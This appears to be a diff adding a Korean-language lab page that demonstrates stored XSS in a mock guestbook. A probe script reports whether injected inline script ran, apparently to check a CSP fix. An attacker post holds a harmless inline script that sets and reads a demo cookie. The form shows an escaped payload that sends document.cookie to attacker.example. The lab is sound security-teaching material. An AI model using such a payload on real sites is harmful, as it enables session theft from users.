@@ -1,0 +1,52 @@
+<!doctype html>
+<html lang="ko">
+<head>
+  <meta charset="utf-8">
+  <title>방명록 - Guestbook</title>
+  <link rel="stylesheet" href="lab.css">
+</head>
+<body>
+  <div class="page">
+    <div class="gb">
+      <div class="gb-head">📖 방명록 <span class="gb-sub">Guestbook</span></div>
+
+      <!-- 진단 증표(취약/조치) — 외부 probe.js가 채움 -->
+      <div id="verdict" class="verdict verdict-pending">진단 중…</div>
+
+      <!-- 방명록 글 목록 -->
+      <div class="posts">
+        <div class="post">
+          <div class="p-meta"><span class="p-name">김철수</span><span class="p-date">2026-07-01</span></div>
+          <div class="p-body">사이트 잘 보고 갑니다!</div>
+        </div>
+        <div class="post">
+          <div class="p-meta"><span class="p-name">이영희</span><span class="p-date">2026-07-02</span></div>
+          <div class="p-body">유용한 정보 감사합니다 :)</div>
+        </div>
+        <!-- 공격자가 등록한 글: 내용에 인라인 <script>가 이스케이프 없이 삽입됨 -->
+        <div class="post post-attacker">
+          <div class="p-meta"><span class="p-name">관리자</span><span class="p-date">2026-07-09</span><span class="p-badge">공격자 글</span></div>
+          <div class="p-body" id="attacker-body">
+            <script>
+              window.__xssRan = true;
+              try { document.cookie = 'XSSDEMO=stolen-session; path=/'; } catch (e) {}
+              window.__stolenCookie = document.cookie;
+            </script>
+          </div>
+        </div>
+      </div>
+
+      <!-- 글쓰기 폼: 공격자가 이 내용을 입력·제출했다고 가정 -->
+      <div class="gb-form">
+        <div class="gb-form-title">✍️ 방명록 남기기 <span class="f-hint">— 공격자가 제출한 입력</span></div>
+        <div class="f-row"><label>이름</label><input value="관리자" readonly></div>
+        <div class="f-row"><label>내용</label><textarea rows="2" readonly>&lt;script&gt;new Image().src='//attacker.example/steal?c='+document.cookie&lt;/script&gt;</textarea></div>
+        <div class="f-actions"><button type="button" disabled>등록</button></div>
+      </div>
+    </div>
+  </div>
+
+  <!-- 진단 스크립트(외부, 같은 출처 'self' → CSP에서도 허용). 인라인 실행 여부로 증표/결과 렌더. -->
+  <script src="probe.js"></script>
+</body>
+</html>
